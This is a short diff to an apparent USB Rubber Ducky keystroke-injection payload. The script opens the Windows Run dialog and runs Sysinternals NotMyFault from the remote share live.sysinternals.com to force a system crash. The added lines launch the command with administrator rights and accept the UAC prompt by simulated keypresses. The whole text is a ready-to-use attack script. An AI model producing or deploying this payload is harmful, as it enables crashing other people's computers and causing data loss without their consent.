@@ -3,3 +3,6 @@ DELAY 300
 GUI r
 DELAY 500
 STRING cmd \\live.sysinternals.com\tools\NotMyfaultc64.exe crash 0x05
+CTRL-SHIFT ENTER
+DELAY 1500
+ALT y
